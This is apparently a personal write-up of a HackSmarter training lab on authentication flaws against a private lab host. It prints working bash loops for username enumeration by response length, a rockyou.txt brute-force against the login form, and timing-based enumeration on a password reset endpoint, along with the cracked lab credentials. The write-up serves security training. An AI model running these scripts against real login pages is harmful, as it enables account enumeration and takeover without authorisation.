# HackSmarter – Authentication Vulnerabilities Lab

## Objective
Analyze authentication surface and logic before attacking. Demonstrate common authentication flaws in a controlled HackSmarter lab environment using measurable signals (length, status codes, timing) and a structured methodology.

## Environment
- Target: `10.1.160.197`
- VPN: OpenVPN (tun0)
- Host: Windows 11 + WSL2 Kali
- Web stack: Werkzeug httpd (Python 3.12)
- Tools: `nmap`, `curl`, `rockyou.txt`, bash automation

---

## Recon Summary (Signal-First)
### Port Discovery
- `22/tcp` SSH (OpenSSH 9.6p1)
- `80/tcp` HTTP (Werkzeug/3.1.5, Python/3.12.3)

### Key Endpoints
- `/login` (auth entry point)
- `/reset-password` (password reset form)

---

## Finding 1 — Username Enumeration (Login)
### Evidence
Login failures returned different response sizes depending on user validity:

- Invalid username response length: **3409 bytes**
- Valid username (wrong password) response length: **3403 bytes**

This creates an oracle that allows attackers to identify valid users.

### Method
Establish baseline length for invalid user, then compare candidates.

#### Identify valid user from `names1.txt`
```bash
while read user; do
  len=$(curl -s -X POST http://10.1.160.197/login \
    -d "username=$user&password=test" | wc -c)

  if [ "$len" != "3409" ]; then
    echo "VALID USER FOUND: $user -> $len"
  fi
done < names1.txt >
Result
Valid user discovered:
tony (3403 bytes)
Finding 2 — Password Spraying / Brute Force (Lab)
Success Signal
Successful authentication identified by HTTP redirect:
Failure: 200 OK
Success: 302 Found (redirect + session behavior)
Method
Stop-on-success brute force using rockyou.txt:

while read -r pass; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST http://10.1.160.197/login \
    -d "username=tony&password=$pass")

  if [ "$code" = "302" ]; then
    echo "PASSWORD FOUND: $pass"
    break
  fi
done < /usr/share/wordlists/rockyou.txt

Result
Credentials discovered (lab only):
tony : basketball
Finding 3 — Username Enumeration via Password Reset (Timing Attack)
Even when responses are generic, response time can leak user existence.
Endpoint
GET /reset-password
POST /reset-password with parameter: username
Timing Oracle Confirmation
Invalid user: ~0.05–0.22s (variable)
Valid user (tony): ~1.58–1.64s (consistently slower)
Enumerate names2.txt by timing
(3 samples per user, sort by slowest)


NAMES2="/mnt/c/Users/tmlyz/Downloads/names2.txt"

while read -r user; do
  total=0
  for i in 1 2 3; do
    t=$(curl -s -o /dev/null -w "%{time_total}" \
      -X POST http://10.1.160.197/reset-password \
      -d "username=$user")
    total=$(awk -v a="$total" -v b="$t" 'BEGIN{print a+b}')
    sleep 0.05
  done
  avg=$(awk -v s="$total" 'BEGIN{print s/3}')
  printf "%-15s %s\n" "$user" "$avg"
done < "$NAMES2" | sort -k2 -n

Result
Valid user discovered by timing outlier:
johnny (~1.615s)

Additional Notes (From Lesson Content)
Registration Enumeration

Registration workflows often leak user existence via explicit messages (e.g., “User already taken”).

Weak Password Policy

Client-side checks can be bypassed by intercepting/modifying registration requests. If the server accepts extremely weak passwords (e.g., 1 character), it indicates weak enforcement.

Rate Limiting / Mass Registration

Automating account creation at scale can confirm lack of throttling and enable account farming / DoS-style resource exhaustion.

Methodology Used (Tomasz HackSmarter Method v1)

Verify VPN (tun0)

Confirm target reachability

Confirm open ports/services (nmap)

Establish baselines (status/length/timing)

Automate only after logic is understood

Capture evidence + validate results

Final Outcomes

Enumerated valid user via login: tony

Discovered lab credentials: tony : basketball

Enumerated valid user via reset timing: johnny
